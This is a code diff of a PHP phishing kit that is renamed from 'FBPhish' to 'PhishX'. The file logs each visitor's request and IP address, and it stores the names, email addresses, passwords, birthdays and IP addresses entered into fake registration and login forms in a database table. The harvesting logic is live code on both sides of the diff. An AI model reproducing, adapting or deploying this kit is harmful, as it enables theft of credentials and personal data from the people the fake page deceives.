@@ -1,7 +1,7 @@
 <?php
 /*
-FBPhish
-Copyright (C) 2016  Jamie4224
+PhishX
+Copyright (c) 2016 Jamie4224
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -24,18 +24,18 @@ $apppath = __DIR__;
 
 // Require . . .
 require_once("$apppath/includes/config.inc.php");
-require_once("$apppath/includes/classes/fbphish.class.php");
+require_once("$apppath/includes/classes/phishx.class.php");
 require_once("$apppath/includes/classes/sql.class.php");
 require_once("$apppath/includes/classes/logger.class.php");
 require_once("$apppath/includes/functions/debug.func.php");
 require_once("$apppath/includes/functions/getip.func.php");
 
-$FBPhish = new FBPhish();
+$PhishX = new PhishX();
 $sql = new sql();
 $logger = new logger();
 
-$FBPhish->init();
-$FBPhish->themecheck();
+$PhishX->init();
+$PhishX->themecheck();
 
 $logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/action.php", "NULL", getIp(), getMetaIp());
 
@@ -151,10 +151,10 @@ if($_GET['action'] == "home/register"){
 			$missing = "NULL";
 		}
 
-		$fbphish_sql_query_insertRegisterData = "INSERT INTO `fbphish_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, 'home/register', CURRENT_TIMESTAMP, '$reg_firstname', '$reg_lastname', '$reg_email', '$reg_email_confirmation', '$reg_passwd', '$reg_birthday_day', '$reg_birthday_month', '$reg_birthday_year', '$reg_sex', 'nl_NL', '$reg_user_ip', '$reg_meta_user_ip', '$missing_string');";
+		$phishx_sql_query_insertRegisterData = "INSERT INTO `phishx_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, 'home/register', CURRENT_TIMESTAMP, '$reg_firstname', '$reg_lastname', '$reg_email', '$reg_email_confirmation', '$reg_passwd', '$reg_birthday_day', '$reg_birthday_month', '$reg_birthday_year', '$reg_sex', 'nl_NL', '$reg_user_ip', '$reg_meta_user_ip', '$missing_string');";
 
 		$sql->db_connect();
-		$sql->query($fbphish_sql_query_insertRegisterData);
+		$sql->query($phishx_sql_query_insertRegisterData);
 		$sql->db_close();
 
 
@@ -234,9 +234,9 @@ if($_GET['action'] == "home/register"){
 			$missing = "NULL";
 		}
 
-		$fbphish_sql_query_insertLoginData = "INSERT INTO `fbphish_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, '$type', CURRENT_TIMESTAMP, '0', '0', '$email', '0', '$passwd', '0', '0', '0', '0', '$locale', '$user_ip', '$meta_user_ip', '$missing_string');";
+		$phishx_sql_query_insertLoginData = "INSERT INTO `phishx_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, '$type', CURRENT_TIMESTAMP, '0', '0', '$email', '0', '$passwd', '0', '0', '0', '0', '$locale', '$user_ip', '$meta_user_ip', '$missing_string');";
 		$sql->db_connect();
-		$sql->query($fbphish_sql_query_insertLoginData);
+		$sql->query($phishx_sql_query_insertLoginData);
 		$sql->db_close();
 
 		// If complete is "true" execute code/sql
